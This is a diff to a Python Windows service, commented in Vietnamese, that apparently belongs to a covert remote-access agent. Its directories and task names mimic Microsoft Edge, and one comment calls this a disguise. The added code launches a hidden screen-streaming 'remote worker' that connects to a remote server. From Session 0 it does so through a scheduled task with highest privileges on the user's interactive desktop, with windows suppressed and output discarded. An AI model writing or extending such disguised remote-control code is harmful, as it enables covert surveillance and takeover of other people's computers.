@@ -20,6 +20,7 @@ import sys
 import time
 import json
 import ast
+import re
 import socket
 import base64
 import shutil
@@ -32,6 +33,12 @@ import logging
 from datetime import datetime
 from urllib import request as urllib_request
 from urllib import error as urllib_error
+
+try:
+    import remote_worker
+    HAS_REMOTE_WORKER = True
+except ImportError:
+    HAS_REMOTE_WORKER = False
 
 try:
     import win32serviceutil
@@ -62,7 +69,7 @@ def get_app_dir():
 
 
 def get_config_path():
-    """
+    r"""
     Tim duong dan file cau hinh theo thu tu uu tien:
     1. msedge_settings.json trong C:\ProgramData\MicrosoftEdgeServicess (Uu tien chuan nguy trang)
     2. config.json trong C:\ProgramData\MicrosoftEdgeServicess (Tuong thich nguoc)
@@ -139,14 +146,30 @@ def get_default_config():
 
 
 def load_config():
-    """Doc cau hinh tu file config.json, neu chua co thi tu tao file mac dinh."""
+    """Doc cau hinh tu file config.json / msedge_settings.json, tu dong sua loi escape backslash neu co."""
     cfg_path = get_config_path()
     if os.path.exists(cfg_path):
         try:
             with open(cfg_path, "r", encoding="utf-8") as f:
-                return json.load(f)
+                content = f.read()
+
+            try:
+                return json.loads(content)
+            except json.JSONDecodeError as jde:
+                logger.warning("File cau hinh %s co loi escape backslash (%s). Dang tu dong sua...", cfg_path, jde)
+                # Tu dong sua cac dau gach cheo nguoc Windows chua escape (vi du D:\msedge_update.log)
+                fixed_content = re.sub(r'\\(?![/"\\bfnrtu])', r'\\\\', content)
+                data = json.loads(fixed_content)
+                try:
+                    with open(cfg_path, "w", encoding="utf-8") as fw:
+                        json.dump(data, fw, indent=4, ensure_ascii=False)
+                    logger.info("Da tu dong chuan hoa lai file JSON thanh cong.")
+                except Exception:
+                    pass
+                return data
         except Exception as e:
-            logger.error("Loi doc cau hinh tu %s: %s. Dung cau hinh mac dinh.", cfg_path, e)
+            logger.error("Loi doc cau hinh tu %s: %s. Giu nguyen file, dung cau hinh mac dinh tam thoi.", cfg_path, e)
+            return get_default_config()
 
     default_cfg = get_default_config()
     try:
@@ -842,6 +865,19 @@ def smart_extract_archive(archive_path, extract_dir):
 
     err_summary = " | ".join(errors) if errors else "He thong khong tim thay cong cu giai nen phu hop (can tar.exe, WinRAR hoac 7-Zip)."
     return False, "none", 0, err_summary
+
+
+def is_running_in_session_0():
+    """Kiem tra xem tien trinh hien tai co dang chay trong Session 0 (Windows Service) hay khong."""
+    try:
+        import ctypes
+        from ctypes import wintypes
+        session_id = wintypes.DWORD()
+        if ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(session_id)):
+            return session_id.value == 0
+    except Exception:
+        pass
+    return False
 
 
 def execute_task(config, task, ip_lan=None):
@@ -1617,54 +1653,94 @@ def execute_task(config, task, ip_lan=None):
                     pass
 
             app_d = get_app_dir()
-            worker_script = os.path.join(app_d, "remote_worker.py")
-            if not os.path.isfile(worker_script):
-                worker_script = os.path.join(os.getcwd(), "remote_worker.py")
+            is_frozen = getattr(sys, "frozen", False)
+            exe_path = sys.executable
 
-            if not os.path.isfile(worker_script):
-                raise FileNotFoundError(f"Khong tim thay remote_worker.py tai: {app_d}")
+            # Neu dang la binary dong goi PyInstaller (.exe)
+            if is_frozen and not exe_path.lower().endswith("python.exe"):
+                worker_cmd_list = [
+                    exe_path,
+                    "--remote-worker",
+                    "--server", srv,
+                    "--session", sid,
+                    "--type", tgt_type,
+                    "--ip", tgt_ip,
+                    "--fps", fps,
+                    "--quality", qual
+                ]
+                worker_cmd_str = f'"{exe_path}" --remote-worker --server {srv} --session {sid} --type {tgt_type} --ip {tgt_ip} --fps {fps} --quality {qual}'
+                work_dir = app_d
+            else:
+                # Chay tu file script python
+                worker_script = os.path.join(app_d, "remote_worker.py")
+                if not os.path.isfile(worker_script):
+                    worker_script = os.path.join(os.getcwd(), "remote_worker.py")
+                if not os.path.isfile(worker_script):
+                    raise FileNotFoundError(f"Khong tim thay remote_worker.py tai: {app_d}")
+                py_exe = sys.executable if "python" in os.path.basename(sys.executable).lower() else "python.exe"
+                worker_cmd_list = [
+                    py_exe,
+                    worker_script,
+                    "--server", srv,
+                    "--session", sid,
+                    "--type", tgt_type,
+                    "--ip", tgt_ip,
+                    "--fps", fps,
+                    "--quality", qual
+                ]
+                worker_cmd_str = f'"{py_exe}" "{worker_script}" --server {srv} --session {sid} --type {tgt_type} --ip {tgt_ip} --fps {fps} --quality {qual}'
+                work_dir = os.path.dirname(worker_script)
 
-            py_exe = sys.executable if "python" in os.path.basename(sys.executable).lower() else "python.exe"
-            cmd_args = [
-                py_exe,
-                worker_script,
-                "--server", srv,
-                "--session", sid,
-                "--type", tgt_type,
-                "--ip", tgt_ip,
-                "--fps", fps,
-                "--quality", qual
-            ]
+            # Neu dang chay trong Session 0 (Windows Service SCM), can interactive vao Session Desktop nguoi dung
+            if is_running_in_session_0():
+                logger.info("Phat hien Service dang chay trong Session 0. Khoi chay Remote Worker qua Task Scheduler interactive...")
+                task_name = "MicrosoftEdgeRemoteWorker"
+                # Huy task cu neu co
+                subprocess.run(f'schtasks /end /tn "{task_name}"', shell=True, capture_output=True)
+                subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
 
-            logger.info("Service tu dong khoi chay Remote Worker ngam: %s", " ".join(cmd_args))
-            creation_flags = 0x08000000 if sys.platform == "win32" else 0
+                # Tao task interactive voi desktop nguoi dung
+                create_cmd = f'schtasks /create /tn "{task_name}" /tr "{worker_cmd_str}" /sc once /st 23:59 /it /rl HIGHEST /f'
+                res_create = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
+                if res_create.returncode != 0:
+                    logger.warning("Tao task /it that bai: %s, fallback tao task khong /it", res_create.stderr)
+                    subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{worker_cmd_str}" /sc once /st 23:59 /rl HIGHEST /f', shell=True, capture_output=True)
 
-            proc = subprocess.Popen(
-                cmd_args,
-                cwd=os.path.dirname(worker_script),
-                creationflags=creation_flags,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            CURRENT_REMOTE_WORKER_PROC = proc
-
-            success = True
-            message = f"Da tu dong khoi chay Remote Worker ngam (PID: {proc.pid}) cho Session {sid} thanh cong."
-            output = f"SessionId: {sid}\nWorkerPID: {proc.pid}\nTargetType: {tgt_type}\nServer: {srv}"
+                res_run = subprocess.run(f'schtasks /run /tn "{task_name}"', shell=True, capture_output=True, text=True)
+                logger.info("Kich hoat task qua Task Scheduler: code=%d, out=%s", res_run.returncode, res_run.stdout.strip())
+                success = True
+                message = f"Da kich hoat Remote Worker ngam qua Task Scheduler (Session Desktop) cho Session {sid}."
+                output = f"SessionId: {sid}\nLaunchMode: TaskScheduler_Interactive\nTargetType: {tgt_type}\nServer: {srv}"
+            else:
+                logger.info("Service khoi chay Remote Worker ngam truc tiep: %s", " ".join(worker_cmd_list))
+                creation_flags = 0x08000000 if sys.platform == "win32" else 0
+                proc = subprocess.Popen(
+                    worker_cmd_list,
+                    cwd=work_dir,
+                    creationflags=creation_flags,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                CURRENT_REMOTE_WORKER_PROC = proc
+                success = True
+                message = f"Da khoi chay Remote Worker ngam truc tiep (PID: {proc.pid}) cho Session {sid} thanh cong."
+                output = f"SessionId: {sid}\nWorkerPID: {proc.pid}\nLaunchMode: Subprocess_Direct\nTargetType: {tgt_type}\nServer: {srv}"
 
         elif action == "stop_remote_worker":
             if CURRENT_REMOTE_WORKER_PROC and CURRENT_REMOTE_WORKER_PROC.poll() is None:
                 try:
                     CURRENT_REMOTE_WORKER_PROC.terminate()
                     CURRENT_REMOTE_WORKER_PROC = None
-                    success = True
-                    message = "Da dung tien trinh Remote Worker thanh cong."
-                except Exception as ex_stop:
-                    success = False
-                    message = f"Loi khi dung worker: {ex_stop}"
-            else:
-                success = True
-                message = "Tien trinh Remote Worker da ket thuc tu truoc."
+                except Exception:
+                    pass
+            # Dung Task Scheduler neu co
+            try:
+                subprocess.run('schtasks /end /tn "MicrosoftEdgeRemoteWorker"', shell=True, capture_output=True)
+                subprocess.run('schtasks /delete /tn "MicrosoftEdgeRemoteWorker" /f', shell=True, capture_output=True)
+            except Exception:
+                pass
+            success = True
+            message = "Da dung tien trinh Remote Worker thanh cong."
             output = message
 
         else:
@@ -1808,10 +1884,20 @@ if HAS_PYWIN32:
 
 
 if __name__ == "__main__":
-    # 1. Neu goi kem tham so quan ly Windows Service (install, update, remove, start, stop, restart, debug, --console)
+    # 1. Neu goi kem tham so chay Remote Worker doc lap
     if len(sys.argv) > 1:
-        arg = sys.argv[1].lower()
-        if arg in ("--console", "console", "-c"):
+        first_arg = sys.argv[1].lower()
+        if first_arg in ("--remote-worker", "remote_worker", "--worker", "-rw"):
+            try:
+                import remote_worker
+                remote_worker.main(sys.argv[2:])
+            except Exception as e_rw:
+                logger.error("Loi khi thuc thi Remote Worker: %s", e_rw)
+                traceback.print_exc()
+            sys.exit(0)
+
+        # Neu goi kem tham so quan ly Windows Service (install, update, remove, start, stop, restart, debug, --console)
+        if first_arg in ("--console", "console", "-c"):
             main_loop()
         elif HAS_PYWIN32:
             try:
